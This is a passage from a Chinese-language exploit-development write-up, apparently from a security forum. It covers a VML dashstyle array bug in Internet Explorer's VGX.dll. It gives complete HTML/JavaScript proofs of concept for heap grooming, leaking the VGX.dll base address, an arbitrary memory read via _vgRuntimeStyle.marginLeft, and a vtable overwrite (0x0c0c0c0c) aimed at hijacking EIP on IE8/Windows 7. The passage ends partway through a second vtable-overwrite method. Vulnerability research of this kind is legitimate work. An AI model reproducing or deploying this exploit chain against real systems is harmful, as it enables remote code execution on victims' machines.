
如此一来，可申请大量空间存储`COAReturnedPointsForAnchor`对象，中间放置`Dashstyle Array`，之后便可访问后续`COAReturnedPointsForAnchor`对象虚表以获取`VGX.dll`基址。但笔者在进行布局时发现其后并非紧接`COAReturnedPointsForAnchor`对象：

```javascript
for(var i=0; i<0x1000; i++){
  rect_array[i] = document.createElement("v:shape")
  rect_array[i].id = "rect" + i.toString()
  document.body.appendChild(rect_array[i])
}
....
for (var i=0; i<0x1000; i++){
  a[i] = document.getElementById("rect" + i.toString())._anchorRect;
  if (i==0x800){
    vml1.dashstyle="1 2 3 4";
  }
}
```

![](https://bbs.kanxue.com/upload/attach/202102/817966_XHN8ZHAC4UWXSAH.jpg)

由上图可以看到是`COAShape`对象，其虚表相对于`VGX.dll`基址偏移为`0x82a48`。经计算，读取该地址数组下标为`0x12`，故笔者构造信息泄露POC如下：

```html
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE9">
</head>

<title>INFO LEAK</title>

<style>v:* { behavior:url(#default#VML); display:inline-block }</style>

<xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" />

<body onload="createRects(); info_leak();">
<v:oval style="width:100pt;height:50pt" fillcolor="red"></v:oval>
<v:oval>
<v:stroke id="vml1" />
</v:oval>
</body>

<script>
var rect_array = new Array()
var a = new Array()

function createRects(){
  for(var i=0; i<0x1000; i++){
    rect_array[i] = document.createElement("v:shape")
    rect_array[i].id = "rect" + i.toString()
    document.body.appendChild(rect_array[i])
  }
}

function info_leak(){

  var vml1 = document.getElementById("vml1")
  for (var i=0; i<0x1000; i++){
    a[i] = document.getElementById("rect" + i.toString())._anchorRect;
    if (i==0x800){
      vml1.dashstyle="1 2 3 4";
    }
  }
  vml1.dashstyle.array.length = 0 - 1;

  var leak = vml1.dashstyle.array.item(0x12);
  alert(leak-0x82a48);

}
</script>

</html>
```

![](https://bbs.kanxue.com/upload/attach/202102/817966_Z6JQWE85PHND2ZA.jpg)

##### `_vgRuntimeStyle`属性

`_vgRuntimeStyle.rotation`对应`COARuntimeStyle::get_rotation`函数，初次访问会申请0xAC大小空间（`COARuntimeStyle::get_rotation`——>`CVMLShape::GetRTSInfo`——>`CParserTag::GetRTSInfo`）：

![](https://bbs.kanxue.com/upload/attach/202102/817966_ANSZA2UFP9SMCSE.jpg)

实际占用空间大小：

![](https://bbs.kanxue.com/upload/attach/202102/817966_A6XRXMEFHBXUH2R.jpg)

那么于其中插入`Dashstyle Array`大小为0xB0（即44个元素，加上头部占用8字节，恰为0xB8）：

![](https://bbs.kanxue.com/upload/attach/202102/817966_NG5PU4STU99M9BR.jpg)

之后写`_vgRuntimeStyle.marginLeft`，对应`COARuntimeStyle::put_marginLeft`函数，由于先前已经申请内存空间，该函数调用`CVMLShape::GetRTSInfo`——>`CParserTag::GetRTSInfo`时便不会再次申请，而是返回内存地址，写入字符位置相对于该地址偏移为`0x58`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_CD98J4XQR5T9V9Y.jpg)

而读`_vgRuntimeStyle.marginLeft`，对应`COARuntimeStyle::get_marginLeft`函数，该函数会将偏移`0x58`处指针指向内容读取出来：

![](https://bbs.kanxue.com/upload/attach/202102/817966_5VASU78S4V89HJJ.jpg)

如此一来，控制`0x58`处指针内容，可实现任意地址读取。

利用漏洞可读写该地址处内容，下标为`0x2E`（`0x2B`对应数组最后一个元素，`0x2C-0x2E`是头部所占用12字节）+`0x16`（`0x58/4`）。完整POC如下：

```html
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE9">
</head>

<title>INFO LEAK</title>

<style>v:* { behavior:url(#default#VML); display:inline-block }</style>

<xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" />

<body onload="createRects(); exploit();">
<v:oval style="width:100pt;height:50pt" fillcolor="red"></v:oval>
<v:oval>
<v:stroke id="vml1" />
</v:oval>
</body>

<script>
var rect_array = new Array()
var a = new Array()

function createRects(){
  for(var i=0; i<0x400; i++){
    rect_array[i] = document.createElement("v:shape")
    rect_array[i].id = "rect" + i.toString()
    document.body.appendChild(rect_array[i])
  }
}

function exploit(){

  var vml1 = document.getElementById("vml1")

  for (var i=0; i<0x400; i++){
    a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle;
  }

  for (var i=0; i<0x400; i++){
    a[i].rotation;
    if (i == 0x300) {
      vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"
    }
  }

  var length_orig = vml1.dashstyle.array.length;
  vml1.dashstyle.array.length = 0 - 1;

  for (var i=0; i<0x400; i++)
  {
    a[i].marginLeft = "a";

    marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);

    if (marginLeftAddress > 0) {
      vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;
      var leak = a[i].marginLeft;
      vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress;
      vml1.dashstyle.array.length = length_orig;
      alert( parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ));
      return;
    }
  }

}
</script>

</html>
```

![](https://bbs.kanxue.com/upload/attach/202102/817966_KY82EBEU9WRE5V5.jpg)

---

#### 0x02.4b 劫持EIP

后续覆盖虚表指针劫持EIP部分，可能是由于笔者环境问题，并未完成。重新搭建环境如下：

- OS版本：Windows 7 Service Pack 1 x86
- Internet Explorer版本：8.0.7601.17514
- `VGX.dll`版本：8.0.7600.16385

该环境下对象布局稍有不同：

![](https://bbs.kanxue.com/upload/attach/202102/817966_WU7MEMVGFB28FX6.jpg)

可以有两种不同的方式覆盖虚表指针。

##### `vgx!COAReturnedPointsForAnchor::vftable`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_QPR3W98MZUWN7VN.jpg)

```html
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE9">
</head>
<title></title>
<style>v:* { behavior:url(#default#VML); display:inline-block }</style>
<xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" />
<script>
var rect_array = new Array()
var a = new Array()

function createRects(){
  for(var i=0; i<0x1000; i++){
    rect_array[i] = document.createElement("v:shape")
    rect_array[i].id = "rect" + i.toString()
    document.body.appendChild(rect_array[i])
  }
}

function exploit(){

  var vml1 = document.getElementById("vml1")

  for (var i=0; i<0x1000; i++){
    a[i] = document.getElementById("rect" + i.toString())._anchorRect;
    if (i == 0x800) {
      vml1.dashstyle = "1 2 3 4"
    }
  }

  vml1.dashstyle.array.length = 0 - 1;
  vml1.dashstyle.array.item(0xC) = 0x0c0c0c0c;

  for (var i=0; i<0x1000; i++)
  {
    delete a[i];
    CollectGarbage();
  }
}
</script>
<body onload="createRects(); exploit();">
<v:oval>
<v:stroke id="vml1" />
</v:oval>
</body>
</html>
```

##### `vgx!COAShape::vftable`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_7GYJ6AYMR5M9YC9.jpg)
